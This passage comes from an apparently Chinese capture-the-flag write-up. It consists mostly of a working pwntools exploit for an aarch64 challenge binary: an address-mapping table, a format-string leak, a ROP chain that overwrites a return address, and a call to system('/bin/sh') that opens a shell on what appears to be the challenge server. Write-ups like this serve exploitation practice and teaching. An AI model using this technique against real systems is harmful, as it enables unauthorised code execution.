class="number">0x1bb752df5b5af919</span> : <span class="number">0x17000000400ff8</span>,<span class="number">0x1c389f40d45af919</span> : <span class="number">0x18000000400ff8</span>,<span class="number">0x1cb98b68555af919</span> : <span class="number">0x19000000400ff8</span>,<span class="number">0x1d3ab711d65af919</span> : <span class="number">0x1a000000400ff8</span>,<span class="number">0x1dbba339575af919</span> : <span class="number">0x1b000000400ff8</span>,<span class="number">0x1e3ccfe2d05af919</span> : <span class="number">0x1c000000400ff8</span>,<span class="number">0x1ebddbca515af919</span> : <span class="number">0x1d000000400ff8</span>,<span class="number">0x1f3ee7b3d25af919</span> : <span class="number">0x1e000000400ff8</span>,<span class="number">0x1fbff39b535af919</span> : <span class="number">0x1f000000400ff8</span>,<span class="number">0x3f99cec5af919</span> : <span class="number">0x20000000400ff8</span>,<span class="number">0x82edb46d5af919</span> : <span class="number">0x21000000400ff8</span>,<span class="number">0x101d1cdee5af919</span> : <span class="number">0x22000000400ff8</span>,<span class="number">0x180c5e56f5af919</span> : <span class="number">0x23000000400ff8</span>,<span class="number">0x207a93ee85af919</span> : <span class="number">0x24000000400ff8</span>,<span class="number">0x286bd16695af919</span> : <span class="number">0x25000000400ff8</span>,<span class="number">0x305816fea5af919</span> : <span class="number">0x26000000400ff8</span>,<span class="number">0x38495476b5af919</span> : <span class="number">0x27000000400ff8</span>,<span class="number">0x40b58d8e45af919</span> : <span class="number">0x28000000400ff8</span>,<span class="number">0x48a4cf0655af919</span> : <span class="number">0x29000000400ff8</span>,<span class="number">0x5097089e65af919</span> : <span class="number">0x2a000000400ff8</span>,<span class="number">0x58864a1675af919</span> : <span class="number">0x2b000000400ff8</span>,<span class="number">0x60f087ae05af919</span> : <span class="number">0x2c000000400ff8</span>,<span class="number">0x68e1c52615af919</span> : <span class="number">0x2d000000400ff8</span>,<span class="number">0x70d202be25af919</span> : <span class="number">0x2e000000400ff8</span>,<span class="number">0x78c3403635af919</span> : <span class="number">0x2f000000400ff8</span>,<span class="number">0x812bb14fc5af919</span> : <span class="number">0x30000000400ff8</span>,<span class="number">0x893af3c7d5af919</span> : <span class="number">0x31000000400ff8</span>,<span class="number">0x9109345fe5af919</span> : <span class="number">0x32000000400ff8</span>,<span class="number">0x991876d7f5af919</span> : <span class="number">0x33000000400ff8</span>,<span class="number">0xa16ebb6f85af919</span> : <span class="number">0x34000000400ff8</span>,<span class="number">0xa97ff9e795af919</span> : <span class="number">0x35000000400ff8</span>,<span class="number">0xb14c3e7fa5af919</span> : <span class="number">0x36000000400ff8</span>,<span class="number">0xb95d7cf7b5af919</span> : <span class="number">0x37000000400ff8</span>,<span class="number">0xc1a1a50f45af919</span> : <span class="number">0x38000000400ff8</span>,<span class="number">0xc9b0e78755af919</span> : <span class="number">0x39000000400ff8</span>,<span class="number">0xd183201f65af919</span> : <span class="number">0x3a000000400ff8</span>,<span class="number">0xd992629775af919</span> : <span class="number">0x3b000000400ff8</span>,<span class="number">0xe1e4af2f05af919</span> : <span class="number">0x3c000000400ff8</span>,<span class="number">0xe9f5eda715af919</span> : <span class="number">0x3d000000400ff8</span>,<span class="number">0xf1c62a3f25af919</span> : <span class="number">0x3e000000400ff8</span>,<span class="number">0xf9d768b735af919</span> : <span class="number">0x3f000000400ff8</span>,<span class="number">0x306476ac8c5af919</span> : <span class="number">0x40000000400ff8</span>,<span class="number">0x30e562840d5af919</span> : <span class="number">0x41000000400ff8</span>,<span class="number">0x31665efd8e5af919</span> : <span class="number">0x42000000400ff8</span>,<span class="number">0x31e74ad50f5af919</span> : <span class="number">0x43000000400ff8</span>,<span class="number">0x3260260e885af919</span> : <span class="number">0x44000000400ff8</span>,<span class="number">0x32e13226095af919</span> : <span class="number">0x45000000400ff8</span>,<span class="number">0x33620e5f8a5af919</span> : <span class="number">0x46000000400ff8</span>,<span class="number">0x33e31a770b5af919</span> : <span class="number">0x47000000400ff8</span>,<span class="number">0x346cd7e8845af919</span> : <span class="number">0x48000000400ff8</span>,<span class="number">0x34edc3c0055af919</span> : <span class="number">0x49000000400ff8</span>,<span class="number">0x356effb9865af919</span> : <span class="number">0x4a000000400ff8</span>,<span class="number">0x35efeb91075af919</span> : <span class="number">0x4b000000400ff8</span>,<span class="number">0x3668874a805af919</span> : <span class="number">0x4c000000400ff8</span>,<span class="number">0x36e99362015af919</span> : <span class="number">0x4d000000400ff8</span>,<span class="number">0x376aaf1b825af919</span> : <span class="number">0x4e000000400ff8</span>,<span class="number">0x37ebbb33035af919</span> : <span class="number">0x4f000000400ff8</span>,<span class="number">0x387534249c5af919</span> : <span class="number">0x50000000400ff8</span>,<span class="number">0x38f4200c1d5af919</span> : <span class="number">0x51000000400ff8</span>,<span class="number">0x39771c759e5af919</span> : <span class="number">0x52000000400ff8</span>,<span class="number">0x39f6085d1f5af919</span> : <span class="number">0x53000000400ff8</span>,<span class="number">0x3a716486985af919</span> : <span class="number">0x54000000400ff8</span>,<span class="number">0x3af070ae195af919</span> : <span class="number">0x55000000400ff8</span>,<span class="number">0x3b734cd79a5af919</span> : <span class="number">0x56000000400ff8</span>,<span class="number">0x3bf258ff1b5af919</span> : <span class="number">0x57000000400ff8</span>,<span class="number">0x3c7d9560945af919</span> : <span class="number">0x58000000400ff8</span>,<span class="number">0x3cfc8148155af919</span> : <span class="number">0x59000000400ff8</span>,<span class="number">0x3d7fbd31965af919</span> : <span class="number">0x5a000000400ff8</span>,<span class="number">0x3dfea919175af919</span> : <span class="number">0x5b000000400ff8</span>,<span class="number">0x3e79c5c2905af919</span> : <span class="number">0x5c000000400ff8</span>,<span class="number">0x3ef8d1ea115af919</span> : <span class="number">0x5d000000400ff8</span>,<span class="number">0x3f7bed93925af919</span> : <span class="number">0x5e000000400ff8</span>,<span class="number">0x3ffaf9bb135af919</span> : <span class="number">0x5f000000400ff8</span>,<span class="number">0x2046f3bcac5af919</span> : <span class="number">0x60000000400ff8</span>,<span class="number">0x20c7e7942d5af919</span> : <span class="number">0x61000000400ff8</span>,<span class="number">0x2144dbedae5af919</span> : <span class="number">0x62000000400ff8</span>,<span class="number">0x21c5cfc52f5af919</span> : <span class="number">0x63000000400ff8</span>,<span class="number">0x2242a31ea85af919</span> : <span class="number">0x64000000400ff8</span>,<span class="number">0x22c3b736295af919</span> : <span class="number">0x65000000400ff8</span>,<span class="number">0x23408b4faa5af919</span> : <span class="number">0x66000000400ff8</span>,<span class="number">0x23c19f672b5af919</span> : <span class="number">0x67000000400ff8</span>,<span class="number">0x244e52f8a45af919</span> : <span class="number">0x68000000400ff8</span>,<span class="number">0x24cf46d0255af919</span> : <span class="number">0x69000000400ff8</span>,<span class="number">0x254c7aa9a65af919</span> : <span class="number">0x6a000000400ff8</span>,<span class="number">0x25cd6e81275af919</span> : <span class="number">0x6b000000400ff8</span>,<span class="number">0x264a025aa05af919</span> : <span class="number">0x6c000000400ff8</span>,<span class="number">0x26cb1672215af919</span> : <span class="number">0x6d000000400ff8</span>,<span class="number">0x27482a0ba25af919</span> : <span class="number">0x6e000000400ff8</span>,<span class="number">0x27c93e23235af919</span> : <span class="number">0x6f000000400ff8</span>,<span class="number">0x2857b134bc5af919</span> : <span class="number">0x70000000400ff8</span>,<span class="number">0x28d6a51c3d5af919</span> : <span class="number">0x71000000400ff8</span>,<span class="number">0x29559965be5af919</span> : <span class="number">0x72000000400ff8</span>,<span class="number">0x29d48d4d3f5af919</span> : <span class="number">0x73000000400ff8</span>,<span class="number">0x2a53e196b85af919</span> : <span class="number">0x74000000400ff8</span>,<span class="number">0x2ad2f5be395af919</span> : <span class="number">0x75000000400ff8</span>,<span class="number">0x2b51c9c7ba5af919</span> : <span class="number">0x76000000400ff8</span>,<span class="number">0x2bd0ddef3b5af919</span> : <span class="number">0x77000000400ff8</span>,<span class="number">0x2c5f1070b45af919</span> : <span class="number">0x78000000400ff8</span>,<span class="number">0x2cde0458355af919</span> : <span class="number">0x79000000400ff8</span>,<span class="number">0x2d5d3821b65af919</span> : <span class="number">0x7a000000400ff8</span>,<span class="number">0x2ddc2c09375af919</span> : <span class="number">0x7b000000400ff8</span>,<span class="number">0x2e5b40d2b05af919</span> : <span class="number">0x7c000000400ff8</span>,<span class="number">0x2eda54fa315af919</span> : <span class="number">0x7d000000400ff8</span>,<span class="number">0x2f596883b25af919</span> : <span class="number">0x7e000000400ff8</span>,<span class="number">0x2fd87cab335af919</span> : <span class="number">0x7f000000400ff8</span>,<span class="number">0x50ab68cc4c5af919</span> : <span class="number">0x80000000400ff8</span>,<span class="number">0x502a7ce4cd5af919</span> : <span class="number">0x81000000400ff8</span>,<span class="number">0x51a9409d4e5af919</span> : <span class="number">0x82000000400ff8</span>,<span class="number">0x512854b5cf5af919</span> : <span class="number">0x83000000400ff8</span>,<span class="number">0x52af386e485af919</span> : <span class="number">0x84000000400ff8</span>,<span class="number">0x522e2c46c95af919</span> : <span class="number">0x85000000400ff8</span>,<span class="number">0x53ad103f4a5af919</span> : <span class="number">0x86000000400ff8</span>,<span class="number">0x532c0417cb5af919</span> : <span class="number">0x87000000400ff8</span>,<span class="number">0x54a3c988445af919</span> : <span class="number">0x88000000400ff8</span>,<span class="number">0x5422dda0c55af919</span> : <span class="number">0x89000000400ff8</span>,<span class="number">0x55a1e1d9465af919</span> : <span class="number">0x8a000000400ff8</span>,<span class="number">0x5520f5f1c75af919</span> : <span class="number">0x8b000000400ff8</span>,<span class="number">0x56a7992a405af919</span> : <span class="number">0x8c000000400ff8</span>,<span class="number">0x56268d02c15af919</span> : <span class="number">0x8d000000400ff8</span>,<span class="number">0x57a5b17b425af919</span> : <span class="number">0x8e000000400ff8</span>,<span class="number">0x5724a553c35af919</span> : <span class="number">0x8f000000400ff8</span>,<span class="number">0x58ba2a445c5af919</span> : <span class="number">0x90000000400ff8</span>,<span class="number">0x583b3e6cdd5af919</span> : <span class="number">0x91000000400ff8</span>,<span class="number">0x59b802155e5af919</span> : <span class="number">0x92000000400ff8</span>,<span class="number">0x5939163ddf5af919</span> : <span class="number">0x93000000400ff8</span>,<span class="number">0x5abe7ae6585af919</span> : <span class="number">0x94000000400ff8</span>,<span class="number">0x5a3f6eced95af919</span> : <span class="number">0x95000000400ff8</span>,<span class="number">0x5bbc52b75a5af919</span> : <span class="number">0x96000000400ff8</span>,<span class="number">0x5b3d469fdb5af919</span> : <span class="number">0x97000000400ff8</span>,<span class="number">0x5cb28b00545af919</span> : <span class="number">0x98000000400ff8</span>,<span class="number">0x5c339f28d55af919</span> : <span class="number">0x99000000400ff8</span>,<span class="number">0x5db0a351565af919</span> : <span class="number">0x9a000000400ff8</span>,<span class="number">0x5d31b779d75af919</span> : <span class="number">0x9b000000400ff8</span>,<span class="number">0x5eb6dba2505af919</span> : <span class="number">0x9c000000400ff8</span>,<span class="number">0x5e37cf8ad15af919</span> : <span class="number">0x9d000000400ff8</span>,<span class="number">0x5fb4f3f3525af919</span> : <span class="number">0x9e000000400ff8</span>,<span class="number">0x5f35e7dbd35af919</span> : <span class="number">0x9f000000400ff8</span>,<span class="number">0x4089eddc6c5af919</span> : <span class="number">0xa0000000400ff8</span>,<span class="number">0x4008f9f4ed5af919</span> : <span class="number">0xa1000000400ff8</span>,<span class="number">0x418bc58d6e5af919</span> : <span class="number">0xa2000000400ff8</span>,<span class="number">0x410ad1a5ef5af919</span> : <span class="number">0xa3000000400ff8</span>,<span class="number">0x428dbd7e685af919</span> : <span class="number">0xa4000000400ff8</span>,<span class="number">0x420ca956e95af919</span> : <span class="number">0xa5000000400ff8</span>,<span class="number">0x438f952f6a5af919</span> : <span class="number">0xa6000000400ff8</span>,<span class="number">0x430e8107eb5af919</span> : <span class="number">0xa7000000400ff8</span>,<span class="number">0x44814c98645af919</span> : <span class="number">0xa8000000400ff8</span>,<span class="number">0x440058b0e55af919</span> : <span class="number">0xa9000000400ff8</span>,<span class="number">0x458364c9665af919</span> : <span class="number">0xaa000000400ff8</span>,<span class="number">0x450270e1e75af919</span> : <span class="number">0xab000000400ff8</span>,<span class="number">0x46851c3a605af919</span> : <span class="number">0xac000000400ff8</span>,<span class="number">0x46040812e15af919</span> : <span class="number">0xad000000400ff8</span>,<span class="number">0x4787346b625af919</span> : <span class="number">0xae000000400ff8</span>,<span class="number">0x47062043e35af919</span> : <span class="number">0xaf000000400ff8</span>,<span class="number">0x4898af547c5af919</span> : <span class="number">0xb0000000400ff8</span>,<span class="number">0x4819bb7cfd5af919</span> : <span class="number">0xb1000000400ff8</span>,<span class="number">0x499a87057e5af919</span> : <span class="number">0xb2000000400ff8</span>,<span class="number">0x491b932dff5af919</span> : <span class="number">0xb3000000400ff8</span>,<span class="number">0x4a9cfff6785af919</span> : <span class="number">0xb4000000400ff8</span>,<span class="number">0x4a1debdef95af919</span> : <span class="number">0xb5000000400ff8</span>,<span class="number">0x4b9ed7a77a5af919</span> : <span class="number">0xb6000000400ff8</span>,<span class="number">0x4b1fc38ffb5af919</span> : <span class="number">0xb7000000400ff8</span>,<span class="number">0x4c900e10745af919</span> : <span class="number">0xb8000000400ff8</span>,<span class="number">0x4c111a38f55af919</span> : <span class="number">0xb9000000400ff8</span>,<span class="number">0x4d922641765af919</span> : <span class="number">0xba000000400ff8</span>,<span class="number">0x4d133269f75af919</span> : <span class="number">0xbb000000400ff8</span>,<span class="number">0x4e945eb2705af919</span> : <span class="number">0xbc000000400ff8</span>,<span class="number">0x4e154a9af15af919</span> : <span class="number">0xbd000000400ff8</span>,<span class="number">0x4f9676e3725af919</span> : <span class="number">0xbe000000400ff8</span>,<span class="number">0x4f1762cbf35af919</span> : <span class="number">0xbf000000400ff8</span>,<span class="number">0x70ee62ec0c5af919</span> : <span class="number">0xc0000000400ff8</span>,<span class="number">0x706f76c48d5af919</span> : <span class="number">0xc1000000400ff8</span>,<span class="number">0x71ec4abd0e5af919</span> : <span class="number">0xc2000000400ff8</span>,<span class="number">0x716d5e958f5af919</span> : <span class="number">0xc3000000400ff8</span>,<span class="number">0x72ea324e085af919</span> : <span class="number">0xc4000000400ff8</span>,<span class="number">0x726b2666895af919</span> : <span class="number">0xc5000000400ff8</span>,<span class="number">0x73e81a1f0a5af919</span> : <span class="number">0xc6000000400ff8</span>,<span class="number">0x73690e378b5af919</span> : <span class="number">0xc7000000400ff8</span>,<span class="number">0x74e6c3a8045af919</span> : <span class="number">0xc8000000400ff8</span>,<span class="number">0x7467d780855af919</span> : <span class="number">0xc9000000400ff8</span>,<span class="number">0x75e4ebf9065af919</span> : <span class="number">0xca000000400ff8</span>,<span class="number">0x7565ffd1875af919</span> : <span class="number">0xcb000000400ff8</span>,<span class="number">0x76e2930a005af919</span> : <span class="number">0xcc000000400ff8</span>,<span class="number">0x76638722815af919</span> : <span class="number">0xcd000000400ff8</span>,<span class="number">0x77e0bb5b025af919</span> : <span class="number">0xce000000400ff8</span>,<span class="number">0x7761af73835af919</span> : <span class="number">0xcf000000400ff8</span>,<span class="number">0x78ff20641c5af919</span> : <span class="number">0xd0000000400ff8</span>,<span class="number">0x787e344c9d5af919</span> : <span class="number">0xd1000000400ff8</span>,<span class="number">0x79fd08351e5af919</span> : <span class="number">0xd2000000400ff8</span>,<span class="number">0x797c1c1d9f5af919</span> : <span class="number">0xd3000000400ff8</span>,<span class="number">0x7afb70c6185af919</span> : <span class="number">0xd4000000400ff8</span>,<span class="number">0x7a7a64ee995af919</span> : <span class="number">0xd5000000400ff8</span>,<span class="number">0x7bf958971a5af919</span> : <span class="number">0xd6000000400ff8</span>,<span class="number">0x7b784cbf9b5af919</span> : <span class="number">0xd7000000400ff8</span>,<span class="number">0x7cf78120145af919</span> : <span class="number">0xd8000000400ff8</span>,<span class="number">0x7c769508955af919</span> : <span class="number">0xd9000000400ff8</span>,<span class="number">0x7df5a971165af919</span> : <span class="number">0xda000000400ff8</span>,<span class="number">0x7d74bd59975af919</span> : <span class="number">0xdb000000400ff8</span>,<span class="number">0x7ef3d182105af919</span> : <span class="number">0xdc000000400ff8</span>,<span class="number">0x7e72c5aa915af919</span> : <span class="number">0xdd000000400ff8</span>,<span class="number">0x7ff1f9d3125af919</span> : <span class="number">0xde000000400ff8</span>,<span class="number">0x7f70edfb935af919</span> : <span class="number">0xdf000000400ff8</span>,<span class="number">0x60cce7fc2c5af919</span> : <span class="number">0xe0000000400ff8</span>,<span class="number">0x604df3d4ad5af919</span> : <span class="number">0xe1000000400ff8</span>,<span class="number">0x61cecfad2e5af919</span> : <span class="number">0xe2000000400ff8</span>,<span class="number">0x614fdb85af5af919</span> : <span class="number">0xe3000000400ff8</span>,<span class="number">0x62c8b75e285af919</span> : <span class="number">0xe4000000400ff8</span>,<span class="number">0x6249a376a95af919</span> : <span class="number">0xe5000000400ff8</span>,<span class="number">0x63ca9f0f2a5af919</span> : <span class="number">0xe6000000400ff8</span>,<span class="number">0x634b8b27ab5af919</span> : <span class="number">0xe7000000400ff8</span>,<span class="number">0x64c446b8245af919</span> : <span class="number">0xe8000000400ff8</span>,<span class="number">0x64455290a55af919</span> : <span class="number">0xe9000000400ff8</span>,<span class="number">0x65c66ee9265af919</span> : <span class="number">0xea000000400ff8</span>,<span class="number">0x65477ac1a75af919</span> : <span class="number">0xeb000000400ff8</span>,<span class="number">0x66c0161a205af919</span> : <span class="number">0xec000000400ff8</span>,<span class="number">0x66410232a15af919</span> : <span class="number">0xed000000400ff8</span>,<span class="number">0x67c23e4b225af919</span> : <span class="number">0xee000000400ff8</span>,<span class="number">0x67432a63a35af919</span> : <span class="number">0xef000000400ff8</span>,<span class="number">0x68dda5743c5af919</span> : <span class="number">0xf0000000400ff8</span>,<span class="number">0x685cb15cbd5af919</span> : <span class="number">0xf1000000400ff8</span>,<span class="number">0x69df8d253e5af919</span> : <span class="number">0xf2000000400ff8</span>,<span class="number">0x695e990dbf5af919</span> : <span class="number">0xf3000000400ff8</span>,<span class="number">0x6ad9f5d6385af919</span> : <span class="number">0xf4000000400ff8</span>,<span class="number">0x6a58e1feb95af919</span> : <span class="number">0xf5000000400ff8</span>,<span class="number">0x6bdbdd873a5af919</span> : <span class="number">0xf6000000400ff8</span>,<span class="number">0x6b5ac9afbb5af919</span> : <span class="number">0xf7000000400ff8</span>,<span class="number">0x6cd50430345af919</span> : <span class="number">0xf8000000400ff8</span>,<span class="number">0x6c541018b55af919</span> : <span class="number">0xf9000000400ff8</span>,<span class="number">0x6dd72c61365af919</span> : <span class="number">0xfa000000400ff8</span>,<span class="number">0x6d563849b75af919</span> : <span class="number">0xfb000000400ff8</span>,<span class="number">0x6ed15492305af919</span> : <span class="number">0xfc000000400ff8</span>,<span class="number">0x6e5040bab15af919</span> : <span class="number">0xfd000000400ff8</span>,<span class="number">0x6fd37cc3325af919</span> : <span class="number">0xfe000000400ff8</span>,<span class="number">0x6f5268ebb35af919</span> : <span class="number">0xff000000400ff8</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x00400700</span></span><br><span class="line">bss = <span class="number">0x412050</span></span><br><span class="line">fake_stack = <span class="number">0x412800</span></span><br><span class="line">name_addr = <span class="number">0x412030</span></span><br><span class="line">ptrs_addr = <span class="number">0x412050</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>] </span><br><span class="line">binsh_addr = <span class="number">0x412095</span></span><br><span class="line">plt_read =  <span class="number">0x004006D0</span> </span><br><span class="line">got_read = <span class="number">0x0411FD8</span></span><br><span class="line">got_puts = <span class="number">0x00411FD0</span></span><br><span class="line">got_printf = <span class="number">0x0411FE0</span></span><br><span class="line"></span><br><span class="line">server_offset = <span class="number">0xe4000</span> + <span class="number">0x4000844000</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">w0 = w22</span></span><br><span class="line"><span class="string">x1 = x23</span></span><br><span class="line"><span class="string">x2 = x24</span></span><br><span class="line"><span class="string">x3 = [X21+X19&lt;&lt;3] -&gt; system</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">x19 = 0</span></span><br><span class="line"><span class="string">x20 = 0</span></span><br><span class="line"><span class="string">x21 = binsh_addr + 8</span></span><br><span class="line"><span class="string">x22 = binsh_addr</span></span><br><span class="line"><span class="string">x23 = 0</span></span><br><span class="line"><span class="string">x24 = 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">x29 = stack_frame</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">auth_ret = <span class="number">0x3b</span></span><br><span class="line">tmp = (auth_ret &lt;&lt; <span class="number">48</span>) | <span class="number">0x400FF8</span></span><br><span class="line">print(f&quot;[+] ret addr : &#123;tmp:#x&#125;&quot;)</span><br><span class="line"></span><br><span class="line">rop_chain = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + flat(</span><br><span class="line">    fake_stack, tmp, <span class="comment"># fp, lr</span></span><br><span class="line">    fake_stack, <span class="number">0x0400FD8</span>, <span class="comment"># fp2, lr2</span></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># x19, x20</span></span><br><span class="line">    binsh_addr+<span class="number">8</span>, binsh_addr, <span class="comment"># x21, x22</span></span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># x23, x24</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    leak = <span class="literal">False</span></span><br><span class="line">    local = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        io = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-cpu&quot;</span>, <span class="string">&quot;max&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;./chall.bak&quot;</span>], aslr=<span class="literal">False</span>)</span><br><span class="line">        <span class="comment"># io = process([&quot;qemu-aarch64&quot;, &quot;-cpu&quot;, &quot;max&quot;, &quot;-g&quot;, &quot;2234&quot;, &quot;-L&quot;, &quot;.&quot;, &quot;.chall.bak&quot;], aslr=False)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io=remote(<span class="string">&quot;52.255.184.147&quot;</span>, <span class="number">8080</span>)</span><br><span class="line">        ru(io, <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">        tail = rv(io, <span class="number">16</span>)</span><br><span class="line">        ru(io, <span class="string">&#x27; == &#x27;</span>)</span><br><span class="line">        sha = io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">        bp(tail, sha, io)</span><br><span class="line"></span><br><span class="line">    sla(io, <span class="string">&quot;name&quot;</span>, flat(<span class="number">0x400FF8</span>, <span class="number">0</span>, <span class="number">0x10A9FC70042</span>, <span class="number">0</span>)) <span class="comment"># patched</span></span><br><span class="line">    add(io, u32(<span class="string">&quot;%p\0\0&quot;</span>))</span><br><span class="line">    lock(io, -<span class="number">2</span>)</span><br><span class="line">    lock(io, -<span class="number">1</span>)</span><br><span class="line">    show(io, <span class="number">0</span>)</span><br><span class="line">    ru(io, <span class="string">&quot;ame: &quot;</span>)</span><br><span class="line">    enc_addr = u64(rv(io, <span class="number">8</span>))</span><br><span class="line">    dec_addr = mapping[enc_addr]</span><br><span class="line">    print(f&quot;dec_addr : &#123;dec_addr:#x&#125;&quot;)</span><br><span class="line">    auth(io, -<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># auth_ret = int(input(&quot;input auth_code : &quot;), 16)</span></span><br><span class="line">    tmp = dec_addr</span><br><span class="line">    print(f&quot;[+] ret addr : &#123;tmp:#x&#125;&quot;)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> leak:</span><br><span class="line">        <span class="comment"># write name</span></span><br><span class="line">        rop_chain = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + flat(</span><br><span class="line">            fake_stack, tmp, <span class="comment"># fp, lr</span></span><br><span class="line">            fake_stack, <span class="number">0x0400FD8</span>, <span class="comment"># fp2, lr2</span></span><br><span class="line">            <span class="number">0</span>, <span class="number">1</span>, <span class="comment"># x19, x20</span></span><br><span class="line">            got_read, <span class="number">0</span>, <span class="comment"># x21, x22</span></span><br><span class="line">            name_addr, <span class="number">0x100</span>, <span class="comment"># x23, x24</span></span><br><span class="line">            </span><br><span class="line">            fake_stack, <span class="number">0x0400FD8</span>, <span class="comment"># fp2, lr2</span></span><br><span class="line">            <span class="number">0</span>, <span class="number">1</span>, <span class="comment"># x19, x20</span></span><br><span class="line">            name_addr+<span class="number">8</span>, name_addr, <span class="comment"># x21, x22</span></span><br><span class="line">            name_addr, <span class="number">0x100</span>, <span class="comment"># x23, x24</span></span><br><span class="line">        )</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        sl(io, rop_chain)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> local:</span><br><span class="line">            sl(io, flat(<span class="string">b&quot;/bin/sh\0&quot;</span>, system_addr))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sl(io, flat(<span class="string">b&quot;/bin/sh\0&quot;</span>, system_addr-<span class="number">0xc000</span>))</span><br><span class="line">        io.interactive()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># write got</span></span><br><span class="line">        rop_chain = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + flat(</span><br><span class="line">            fake_stack, tmp, <span class="comment"># fp, lr</span></span><br><span class="line">            fake_stack, <span class="number">0x0400FD8</span>, <span class="comment"># fp2, lr2</span></span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># x19, x20</span></span><br><span class="line">            got_puts, got_puts, <span class="comment"># x21, x22</span></span><br><span class="line">            got_puts, <span class="number">0x100</span>, <span class="comment"># x23, x24</span></span><br><span class="line">        )</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        sl(io, rop_chain)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        puts_addr = rv(io, <span class="number">3</span>)</span><br><span class="line">        print(puts_addr.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">res = debug()</span><br></pre></td></tr></table></figure>

<p>其中mapping用来从编码后的地址查找编码前的地址, <del>因为太长我就删掉了</del>. 使用如下程序生成:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;     </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hexdump</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* buf, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; size;i += <span class="number">16</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%08x:&quot;</span>, i);</span><br><span class="line">        <span class="keyword">for</span> (j = i;j &lt; size &amp;&amp; j &lt; i + <span class="number">16</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; %02x&quot;</span>, buf[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 